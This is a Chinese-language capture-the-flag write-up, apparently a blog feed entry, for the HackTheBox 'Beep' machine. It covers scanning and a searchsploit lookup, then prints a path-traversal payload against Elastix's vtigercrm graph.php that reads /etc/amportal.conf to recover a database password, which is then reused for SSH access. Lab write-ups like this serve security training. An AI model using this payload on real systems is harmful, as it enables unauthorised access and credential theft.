            "title": "HTB-Beep",
            "date_published": "2025-02-03T11:39:41.000Z",
            "content_html": "<p><img loading=\"lazy\" data-src=\"/2025/02/03/htb-beep/995f465295b99869fce21ecadea4604c.png\" class=\"\"></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">OS</th>\n<th style=\"text-align:left\">Difficulty</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">Linux</td>\n<td style=\"text-align:left\">Easy</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"nmap-scan\"><a class=\"anchor\" href=\"#nmap-scan\">#</a> Nmap Scan</h3>\n<p><img loading=\"lazy\" data-src=\"/2025/02/03/htb-beep/image-20250202162932802.png\" class=\"\" title=\"nmap\"></p>\n<p>添加映射</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"10.10.10.7  beep.htb\"</span> <span class=\"token operator\">|</span> <span class=\"token function\">sudo</span> <span class=\"token function\">tee</span> /etc/hosts</pre></td></tr></table></figure><p>访问<a href=\"https://beep.htb\"> https://beep.htb</a> 发现新版火狐浏览器不支持低版本 SSL，修改浏览器配置，地址栏输入 <code>about:config</code>  , 输入 <code>security.tls.version.min</code>  修改值为 1</p>\n<p><img loading=\"lazy\" data-src=\"/2025/02/03/htb-beep/image-20250202170324934.png\" class=\"\" title=\"修改火狐配置\"></p>\n<p><img loading=\"lazy\" data-src=\"/2025/02/03/htb-beep/image-20250202170450821.png\" class=\"\" title=\"访问目标\"></p>\n<h3 id=\"漏洞利用\"><a class=\"anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h3>\n<p>使用 searchsploit 检索 Elastix ，查看 <code>37637.pl</code>  , 获取到 payload： <code>/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</code>    搜索关键字 &quot;AMPDBPASS&quot; 获取到密码</p>\n<p><img loading=\"lazy\" data-src=\"/2025/02/03/htb-beep/image-20250202171030333.png\" class=\"\" title=\"searchsploit\"></p>\n<p><img loading=\"lazy\" data-src=\"/2025/02/03/htb-beep/image-20250202172215531.png\" class=\"\" title=\"payload\"></p>\n<p>使用获取到的密码进行 ssh 登录，发现算法不支持，修改一下本地配置：编辑～/.ssh/config 添加</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Host *</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  Ciphers +aes128-cbc</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  KexAlgorithms +diffie-hellman-group14-sha1,diffie-hellman-group1-sha1</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  HostKeyAlgorithms +ssh-rsa</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"/2025/02/03/htb-beep/image-20250202172249979.png\" class=\"\" title=\"ssh\"></p>\n<p><img loading=\"lazy\" data-src=\"/2025/02/03/htb-beep/image-20250202172514124.png\" class=\"\" title=\"修改ssh配置\"></p>\n<p><img loading=\"lazy\" data-src=\"/2025/02/03/htb-beep/image-20250203203836733.png\" class=\"\" title=\"ssh访问\"></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">Flag</th>\n<th style=\"text-align:left\">Path</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">Flag1</td>\n<td style=\"text-align:left\">/home/fanis/user.txt</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">Flag2</td>\n<td style=\"text-align:left\">/root/root.txt</td>\n</tr>\n</tbody>\n</table>\n",
            "tags": [
                "密码重用"
            ]
        }
    ]
}